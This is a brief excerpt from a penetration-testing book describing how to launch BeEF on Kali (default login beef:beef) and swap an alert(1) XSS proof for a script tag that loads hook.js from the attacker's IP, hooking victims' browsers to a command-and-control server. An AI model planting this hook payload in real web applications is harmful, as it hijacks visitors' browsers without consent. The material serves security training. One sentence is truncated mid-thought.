Start BeEF on Your Attacker Kali Host From a Terminal  beef-xss  Authenticate with beef:beef  
View http://127.0.0.1:3000/hook.js  Full Payload Hook File:  <script src="http://<Your IP>:3000/hook.js"></script>  
Viewing your hook.js file located on http://127.0.0.1:3000/hook.js, you should see something that resembles a 
long-obfuscated JavaScript file.  This is the client payload to connect your victim back to the command and control server.  
Once you have identified an XSS on your target application, instead of the original alert(1) style payload, 
you would modify the <script src="http://<Your IP>:3000/hook.js"></script> payload to exploit the vulnerability.
this XSS trap, it will cause their browser to connect back to you and be a part of your Zombie network.


Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (pp. 56-57). Secure Planet. Kindle Edition. 
